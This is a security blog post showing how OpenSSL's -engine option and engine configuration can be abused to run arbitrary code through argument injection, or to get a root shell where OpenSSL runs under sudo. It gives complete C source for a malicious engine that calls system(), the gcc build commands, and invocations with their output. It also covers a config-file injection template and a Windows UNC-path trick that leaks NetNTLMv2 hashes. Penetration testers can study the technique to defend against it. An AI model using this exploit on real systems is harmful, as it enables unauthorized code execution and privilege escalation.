---
layout: page
title: OpenSSL Arg Injection 
permalink: /openssl-arginjection/
---

# OpenSSL code execution through argument injection

This is a short little post detailing how to get OpenSSL to run arbitrary code through the use of the `-engine` option. As detailed in the docs, an OpenSSL engine is a new component "to support alternative cryptography implementations, most commonly for interfacing with external crypto devices".  These engines consist of compiled code which is loaded by OpenSSL, and can be used to run arbitrary code. 

This is useful in situations such as if you have the ability to pass arguments (like in an argument injection vulnerability) to OpenSSL, or can alter a configuration file used to generate certificates. If you have sudo access to OpenSSL, you can easily elevate to full root. Exploiting this does however require placing the malicious engine file somewhere on the disk of the target file system. 

On Windows (using a commonly distributed OpenSSL windows binary) it appears you can also use UNC paths for the engine DLLs, which also has the convenient effect of disclosing NetNTLMv2 hashes should you wish them. However, if you're at this point, you should be able to get command execution using a malicious engine.

I've found multiple applications that allow argument injection into OpenSSL, and using this argument injection has enabled me to turn that into code execution.

## Details

For demonstration purposes, I have a system running Debian 10 with OpenSSL installed and the `libssl-dev` package. Create a file "engine.c", with the following contents:

```
#include <stdio.h>
#include <openssl/engine.h>

static const char *engine_id = "malengine";
static const char *engine_name = "Engine for executing arbitrary code";

static int bind(ENGINE *e, const char *id){
    int ret = 0;
    int status = system("/bin/bash -c 'echo \"arbitrary code\"'");
    if(!ENGINE_set_id(e,engine_id)){
        fprintf(stderr, "Failed\n");
        goto end;
    }
    if(!ENGINE_set_name(e,engine_name)){
        fprintf(stderr, "Failed\n");
        goto end;
    }
    ret = 1;
    end:
        return ret;
}

IMPLEMENT_DYNAMIC_BIND_FN(bind)
IMPLEMENT_DYNAMIC_CHECK_FN()
```
This file is mostly sourced from [this OpenSSL blog](https://www.openssl.org/blog/blog/2015/10/08/engine-building-lesson-1-a-minimum-useless-engine/).


Compile it using the following gcc command, which will create the `engine.so` shared library. The engine file does not need to end in .so. This is very convenient as if you have a a web application that only allows whitelisted extensions for files written to disk you can get an engine file on there. 

`gcc -fPIC -o a.o -c engine.c && gcc -shared -o engine.so -lcrypto a.o`

and then use the following OpenSSL command:
`openssl req -engine ~/engine.so`

which will output the following:
```
user@debian10:~$ openssl req -engine ~/engine.so
arbitrary code
engine "rce" set.
```

If you can run openSSL with sudo, you can spawn a bash shell:

`int status = system("/bin/bash");`

```
user@debian10:~$ sudo openssl req -engine ~/engine.so
root@debian10:/home/user# id
uid=0(root) gid=0(root) groups=0(root)
root@debian10:/home/user# 
```

Several other OpenSSL commands seem to support the engine parameter, such as  
```
openssl rsa -engine ~/engine.so
openssl s_client -engine ~/engine.so
openssl x509 -engine ~/engine.so
```

and probably some more, just check the man page. 

Exploiting these in argument injection vulnerabilities isn't always trivial as just injecting the engine parameter, as depending on the position of the injected argument you may also need to have a valid set of OpenSSL arguments. Interestingly enough the engine seems to be loaded even if the other Openssl args are invalid, as long as the engine argument preceeds the invalid argument. So we see:

```
user@debian10:~$ openssl req INVALID -engine ~/engine.so
req: Use -help for summary.
user@debian10:~$  

```
doesn't work, however the following does:
```
user@debian10:~$ openssl req -engine ~/engine.so INVALID
arbitrary code
engine "rce" set.
req: Use -help for summary.
user@debian10:~$ 
```

If you can write multiple lines into an OpenSSL config file somehow (%0a perhaps...), you can probably get an engine reference in there. Create a config file like:

```
[default]
openssl_conf = openssl_init

[openssl_init]
engines = engine_section

[engine_section]
foo = foo_section

[foo_section]
dynamic_path = /home/user/engine.so
init = 1

```

then when this is used by OpenSSL:
```
user@debian10:~$ openssl req -new -config test.cnf
arbitrary code
Generating a RSA private key
..........................+++++
............................+++++
writing new private key to stdout
```

One of the major downsides with malicious engines like this is that they are not particularly portable. If your target system is running an older or newer version of OpenSSL your generated engine may not work. You'll need to set up an environment that matches the target system to compile the engine, or do it on the target system if possible. There may be a way to generate more portable versions of these engines that work with multiple versions of OpenSSL.

Also, it probably doesn't need saying but *this is not a vulnerability in OpenSSL*.
